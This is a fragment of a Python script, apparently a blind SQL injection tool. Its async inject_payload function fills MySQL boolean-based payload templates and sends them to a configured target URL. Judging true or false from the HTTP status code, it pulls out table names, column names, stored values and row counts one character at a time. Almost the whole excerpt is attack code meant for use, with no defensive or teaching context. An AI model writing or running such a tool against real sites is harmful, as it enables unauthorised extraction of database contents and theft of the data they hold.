...
async def inject_payload(session, data):
    ...
    payload_table_name = table_name_payloads_boolen_based_blind["MySQL"][0].format(position=data["position"], offset=data["offset"], operator=data["operator"], char=data["char"])
    payload_column_name = column_name_payloads_boolen_based_blind["MySQL"][0].format(position=data["position"], table=cfg.usr_table, offset=data["offset"], operator=data["operator"], char=data["char"])
    payload_entity_name = entity_name_payloads_boolen_based_blind["MySQL"][0].format(column=cfg.usr_column, position=data["position"], table=cfg.usr_table, offset=data["offset"], operator=data["operator"], char=data["char"])
    payload_entity_count = entity_count_payloads_boolen_based_blind["MySQL"][0].format(column=cfg.usr_column, table=cfg.usr_table, operator=data["operator"], num=data["num"])
    ...
    if cfg.usr_mode == 'entity-test':
        ...
        async with session.get(cfg.usr_url+payload_column_name, allow_redirects=False) as response:
            ...
            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] column name: {data['general_name']} | offset [{data['offset']}]")
            return response.status == cfg.true_code
        ...
        async with session.get(cfg.usr_url+payload_entity_name, allow_redirects=False) as response:
            ...
            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] entity name: {data['general_name']} | offset [{data['offset']}]")
            return response.status == cfg.true_code
        ...
        async with session.get(cfg.usr_url+payload_entity_count, allow_redirects=False) as response:
            ...
            sys.stdout.write("\033[u")
            sys.stdout.write(f"\033[2K\r[+] entity count: {data['entity_counter']} | offset [{data['offset']}]")
            return response.status == cfg.true_code
    else:
